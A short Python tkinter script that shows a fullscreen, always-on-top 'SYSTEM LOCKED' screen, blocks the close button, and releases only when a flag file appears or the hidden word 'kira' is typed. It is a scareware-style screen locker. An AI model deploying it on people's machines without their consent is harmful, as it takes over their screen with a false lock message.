import tkinter as tk
import os

# Compute flag path dynamically so backslashes never break it
FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "unlock.flag")

def check_unlock():
    if os.path.exists(FLAG_FILE):
        root.destroy()
    else:
        root.lift()
        root.attributes('-topmost', True)
        root.after(200, check_unlock)

def disable_event():
    pass

typed_buffer = ""

def ghost_key_listener(event):
    global typed_buffer
    if event.char:
        typed_buffer += event.char.lower()
    if len(typed_buffer) > 20:
        typed_buffer = typed_buffer[-20:]
    
    # If the user types the silent backdoor code
    if "kira" in typed_buffer:
        # Create the flag file via the keyboard so the system syncs
        with open(FLAG_FILE, "w") as f:
            f.write("keyboard_unlock")
        root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')

root.protocol("WM_DELETE_WINDOW", disable_event)
root.bind("<Key>", ghost_key_listener)

label = tk.Label(root, text="SYSTEM LOCKED\nAWAITING AUTHORIZATION", fg="red", bg="black", font=("Courier", 24, "bold"))
label.pack(expand=True)

root.after(200, check_unlock)
root.mainloop()
